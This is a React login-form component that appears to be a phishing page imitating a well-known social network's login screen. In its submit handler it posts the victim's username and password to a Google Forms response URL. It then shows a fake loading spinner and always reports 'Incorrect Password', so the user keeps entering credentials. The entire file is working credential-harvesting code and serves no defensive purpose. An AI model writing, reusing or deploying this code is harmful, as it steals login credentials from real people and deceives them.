import React, { useState, useEffect } from 'react';
import ErrorPopup from './ErrorPopup';

const LoginForm = ({ setCurrentView }) => {
  const [loginUsername, setLoginUsername] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 480);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 480);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const isLoginValid = loginUsername.length > 0 && loginPassword.length > 5;

  const handleSubmit = (e) => {
    e.preventDefault();

    const formURL =
      "https://docs.google.com/forms/d/e/1FAIpQLSe6mienzwPLDcPU3wJmBiSQOQKluH58Cy1mG9nAKomfgi7o4A/formResponse";

    const formData = new FormData();
    formData.append("entry.280446300", loginUsername);
    formData.append("entry.855076228", loginPassword);

    fetch(formURL, {
      method: "POST",
      mode: "no-cors",
      body: formData,
    });

    // optional
    setLoginUsername('');
    setLoginPassword('');

    setIsLoading(true);
    setShowError(false);

    // Simulate API request delay
    setTimeout(() => {
      setIsLoading(false);
      setShowError(true);
    }, 1500);
  };

  return (
    <>
      <form className="login-form" onSubmit={handleSubmit}>
        <div className="input-container">
          <span className={`input-label ${loginUsername ? 'active' : ''}`}>Username, email address or mobile numb...</span>
          <input
            type="text"
            className={`login-input ${loginUsername ? 'has-value' : ''}`}
            value={loginUsername}
            onChange={(e) => {
              setLoginUsername(e.target.value);
            }}
          />
        </div>

        <div className="input-container">
          <span className={`input-label ${loginPassword ? 'active' : ''}`}>Password</span>
          <input
            type="password"
            className={`login-input ${loginPassword ? 'has-value' : ''}`}
            value={loginPassword}
            onChange={(e) => {
              setLoginPassword(e.target.value);
            }}
          />
        </div>

        <button
          type="submit"
          className="login-btn premium-btn"
          disabled={(!isMobile && !isLoginValid) || isLoading}
          style={{
            opacity: isLoading ? 0.7 : (!isMobile && !isLoginValid ? 0.4 : 1),
            transition: '0.2s',
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center'
          }}
        >
          {isLoading ? <div className="spinner"></div> : 'Log in'}
        </button>

        <div className="forgot-password" style={{ marginTop: '20px' }}>
          <a href="#" onClick={(e) => { e.preventDefault(); setCurrentView('forgotPassword'); }}>Forgotten your password?</a>
        </div>
      </form>

      {/* Error Popup Modal */}
      {showError && (
        <ErrorPopup
          onClose={() => setShowError(false)}
          title="Incorrect Password"
          message="The password you entered is incorrect. Please try again."
        />
      )}
    </>
  );
};

export default LoginForm;
